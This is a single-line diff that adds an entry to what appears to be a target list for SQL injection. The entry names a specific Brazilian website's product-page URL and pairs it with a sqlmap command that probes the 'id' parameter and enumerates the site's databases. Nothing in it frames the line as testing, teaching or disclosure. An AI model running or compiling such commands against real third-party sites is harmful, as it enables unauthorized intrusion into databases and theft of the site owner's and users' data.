@@ -1,0 +1,1 @@
+http://www.tdm-mg.com.br/produtos.php?id=8 (GET)  # sqlmap.py -u http://www.tdm-mg.com.br/produtos.php?id=8 --dbs
